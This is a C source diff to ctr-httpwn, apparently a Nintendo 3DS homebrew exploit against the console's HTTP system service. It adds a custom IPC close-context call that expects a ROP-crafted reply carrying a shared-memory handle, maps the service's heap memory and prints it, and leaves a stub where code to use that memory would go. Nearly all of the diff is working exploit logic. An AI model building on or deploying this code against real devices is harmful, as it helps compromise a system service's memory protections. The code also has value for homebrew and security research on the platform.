@@ -9,6 +9,7 @@
 
 #include "cmpblock_bin.h"
 
+extern Handle __httpc_servhandle;
 extern u32 *__httpc_sharedmem_addr;
 
 Result init_hax_sharedmem(u32 *tmpbuf);
@@ -22,6 +23,33 @@ void displaymessage_waitbutton()
 		hidScanInput();
 		if(hidKeysDown() & KEY_A)break;
 	}
+}
+
+Result _HTTPC_CloseContext(Handle handle, Handle contextHandle, Handle *sharedmem_handle)
+{
+	u32* cmdbuf=getThreadCommandBuffer();
+
+	cmdbuf[0]=IPC_MakeHeader(0x3,1,0); // 0x30040
+	cmdbuf[1]=contextHandle;
+	
+	Result ret=0;
+	if(R_FAILED(ret=svcSendSyncRequest(handle)))return ret;
+
+	if(cmdbuf[1]==0 && cmdbuf[0]!=0x00030042)return -1;//The ROP is supposed to return a custom cmdreply.
+
+	if(cmdbuf[1]==0)*sharedmem_handle = cmdbuf[3];
+
+	return cmdbuf[1];
+}
+
+Result _httpcCloseContext(httpcContext *context, Handle *sharedmem_handle)
+{
+	Result ret=0;
+
+	svcCloseHandle(context->servhandle);
+	ret = _HTTPC_CloseContext(__httpc_servhandle, context->httphandle, sharedmem_handle);
+
+	return ret;
 }
 
 //This searches physmem for the page which starts with the data stored in cmpblock_bin. The first byte in cmpblock is XORed with 0x01 to avoid detecting the cmpblock in physmem.
@@ -131,6 +159,8 @@ Result http_haxx(char *requrl)
 	Result ret=0;
 	httpcContext context;
 	u32 *linearaddr = NULL;
+	Handle httpheap_sharedmem_handle=0;
+	vu32 *httpheap_sharedmem = NULL;
 
 	ret = httpcOpenContext(&context, HTTPC_METHOD_POST, requrl, 1);
 	if(ret!=0)return ret;
@@ -164,12 +194,41 @@ Result http_haxx(char *requrl)
 	}
 
 	printf("Triggering the haxx...\n");
-	ret = httpcCloseContext(&context);
+	ret = _httpcCloseContext(&context, &httpheap_sharedmem_handle);
 	if(R_FAILED(ret))
 	{
 		printf("httpcCloseContext returned 0x%08x.\n", (unsigned int)ret);
 		if(ret==0xC920181A)printf("This error means the HTTP sysmodule crashed.\n");
+		return ret;
 	}
+
+	httpheap_sharedmem = (vu32*)mappableAlloc(0x22000);
+	if(httpheap_sharedmem==NULL)
+	{
+		ret = -2;
+		return ret;
+	}
+
+	if(R_FAILED(ret=svcMapMemoryBlock(httpheap_sharedmem_handle, (u32)httpheap_sharedmem, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE)))
+	{
+		svcCloseHandle(httpheap_sharedmem_handle);
+		mappableFree((void*)httpheap_sharedmem);
+		httpheap_sharedmem = NULL;
+
+		printf("svcMapMemoryBlock with the httpheap sharedmem failed: 0x%08x.\n", (unsigned int)ret);
+		return ret;
+	}
+
+	printf("Successfully mapped the httpheap sharedmem.\n");
+	printf("heap+0: 0x%08x 0x%08x 0x%08x 0x%08x\n", (unsigned int)httpheap_sharedmem[0], (unsigned int)httpheap_sharedmem[1], (unsigned int)httpheap_sharedmem[2], (unsigned int)httpheap_sharedmem[3]);
+
+	//Add code which actually uses httpheap_sharedmem here.
+
+	svcUnmapMemoryBlock(httpheap_sharedmem_handle, (u32)httpheap_sharedmem);
+
+	svcCloseHandle(httpheap_sharedmem_handle);
+	mappableFree((void*)httpheap_sharedmem);
+	httpheap_sharedmem = NULL;
 
 	return 0;
 }
@@ -241,6 +300,8 @@ int main(int argc, char **argv)
 	printf("ctr-httpwn %s by yellows8.\n", VERSION);
 
 	ret = httpwn_setup();
+
+	if(ret==0)printf("Done.\n");
 
 	if(ret!=0)printf("An error occured. If this is an actual issue not related to user failure, please report this to here if it persists(or comment on an already existing issue if needed), with a screenshot: https://github.com/yellows8/ctr-httpwn/issues\n");
 
